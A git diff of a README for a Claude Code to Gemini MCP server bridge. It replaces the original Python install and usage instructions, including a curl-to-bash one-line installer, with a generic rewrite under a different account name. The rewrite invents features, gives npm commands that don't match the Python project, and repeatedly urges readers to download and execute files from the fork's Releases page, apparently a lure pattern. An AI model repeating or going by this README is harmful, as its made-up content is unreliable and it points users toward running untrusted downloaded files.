@@ -1,104 +1,120 @@
-# Claude Code + Gemini MCP Server
+# Claude Code Gemini MCP 🚀
 
-Connect Claude Code with Google's Gemini AI for powerful AI collaboration. Ask Gemini questions, get code reviews, and brainstorm ideas - all within Claude Code!
+Welcome to the **Claude Code Gemini MCP** repository! This project aims to simplify the Gemini framework for Claude AI, making it easier for developers to implement and manage their applications. 
 
-## 🚀 Quick Start (2 minutes)
+![Gemini Logo](https://img.shields.io/badge/Gemini-Simplified-blue.svg) ![MCP Server](https://img.shields.io/badge/MCP-Server-green.svg)
 
-### Prerequisites
-- Python 3.8+ installed
-- Claude Code CLI installed
-- Google Gemini API key ([Get one free](https://aistudio.google.com/apikey))
+## Table of Contents
 
-### One-Line Install
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Topics](#topics)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Support](#support)
+9. [Releases](#releases)
 
-```bash
-curl -sSL https://raw.githubusercontent.com/RaiAnsar/claude_code-gemini-mcp/main/install.sh | bash
-```
+## Introduction
 
-### Manual Install
+The **Claude Code Gemini MCP** is designed to enhance your experience with the Gemini framework. It streamlines the process of building and deploying applications, providing tools and features that cater to both beginners and experienced developers. This repository focuses on clarity and ease of use, ensuring that you can get started quickly and efficiently.
 
-1. **Clone this repo:**
-```bash
-git clone https://github.com/RaiAnsar/claude_code-gemini-mcp.git
-cd claude_code-gemini-mcp
-```
+## Features
 
-2. **Run setup with your API key:**
-```bash
-./setup.sh YOUR_GEMINI_API_KEY
-```
+- **User-Friendly Interface**: The interface is designed to be intuitive, making it easy for users to navigate.
+- **Integration with Claude AI**: Seamlessly connect your applications with Claude AI for enhanced functionality.
+- **MCP Server Support**: Built-in support for MCP servers allows for smooth operation and management.
+- **Lightweight and Fast**: Optimized for performance, ensuring that your applications run smoothly.
+- **Extensive Documentation**: Comprehensive guides and examples to help you get started.
 
-That's it! 🎉
+## Installation
 
-## 📖 Usage
+To get started with **Claude Code Gemini MCP**, follow these simple steps:
 
-Start Claude Code anywhere and use these commands:
+1. Clone the repository:
 
-```bash
-claude
+   ```bash
+   git clone https://github.com/Manuka112/claude_code-gemini-mcp.git
+   ```
 
-# Ask Gemini anything
+2. Navigate to the project directory:
 
-mcp__gemini-collab__ask_gemini
-  prompt: "Explain quantum computing in simple terms"
+   ```bash
+   cd claude_code-gemini-mcp
+   ```
 
-# Get code reviews
-mcp__gemini-collab__gemini_code_review
-  code: "def auth(u): return u.pwd == 'admin'"
-  focus: "security"
+3. Install the required dependencies:
 
-# Brainstorm ideas
-mcp__gemini-collab__gemini_brainstorm
-  topic: "How to scale a web app to 1M users"
+   ```bash
+   npm install
+   ```
 
-Or simply ask claude code to correlate with Gemini, it is not a rocket sciene... (Author's note) 
-```
+4. Start the application:
 
-## 🛠️ What This Does
+   ```bash
+   npm start
+   ```
 
-1. Installs the Google Gemini Python SDK
-2. Sets up an MCP server that bridges Claude Code and Gemini
-3. Configures it globally (works in any directory)
-4. Provides tools for collaboration between Claude and Gemini
+For detailed installation instructions, please refer to the [Releases](https://github.com/Manuka112/claude_code-gemini-mcp/releases) section.
 
-## 🔧 Available Tools
+## Usage
 
-- **ask_gemini** - Ask Gemini any question
-- **gemini_code_review** - Get security/performance code reviews
-- **gemini_brainstorm** - Brainstorm ideas and solutions
+Once you have installed the application, you can start using it right away. Here are some basic commands to get you started:
 
-## 📁 Installation Location
+- **Initialize a new project**:
 
-The server is installed at: `~/.claude-mcp-servers/gemini-collab/`
+   ```bash
+   npm run init
+   ```
 
-## 🐛 Troubleshooting
+- **Run the MCP server**:
 
-**MCP not showing up?**
-```bash
-# Check if it's installed
-claude mcp list
+   ```bash
+   npm run server
+   ```
 
-# Reinstall with global scope
-claude mcp remove gemini-collab
-claude mcp add --scope user gemini-collab python3 ~/.claude-mcp-servers/gemini-collab/server.py
-```
+- **Deploy your application**:
 
-**Connection errors?**
-- Check your API key is valid
-- Ensure Python has `google-generativeai` installed: `pip install google-generativeai`
+   ```bash
+   npm run deploy
+   ```
 
-## 🔑 Update API Key
+Feel free to explore the various commands and options available. The more you use it, the more you'll discover its capabilities.
 
-Edit `~/.claude-mcp-servers/gemini-collab/server.py` and replace the API key.
+## Topics
 
-## 🤝 Contributing
+This repository covers several important topics:
 
-Pull requests welcome! Please keep it simple and beginner-friendly.
+- **claude-ai**: Integration with Claude AI for advanced features.
+- **gemini-flash**: Quick deployment and management of Gemini applications.
+- **mcp**: Comprehensive support for MCP server functionalities.
+- **mcp-server**: Tools and scripts to manage your MCP server efficiently.
 
-## 📜 License
+## Contributing
 
-MIT - Use freely!
+We welcome contributions from the community! If you would like to contribute, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request.
 
-Made with ❤️ for the Claude Code community
+Please ensure that your code follows the existing style and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support
+
+If you encounter any issues or have questions, please feel free to open an issue in this repository. We will do our best to respond promptly.
+
+## Releases
+
+To download the latest version of the **Claude Code Gemini MCP**, visit the [Releases](https://github.com/Manuka112/claude_code-gemini-mcp/releases) section. You can find the necessary files to download and execute.
+
+![Download Button](https://img.shields.io/badge/Download_Latest_Version-blue.svg)
+
+Thank you for checking out **Claude Code Gemini MCP**! We hope you find it useful and easy to work with. Happy coding!
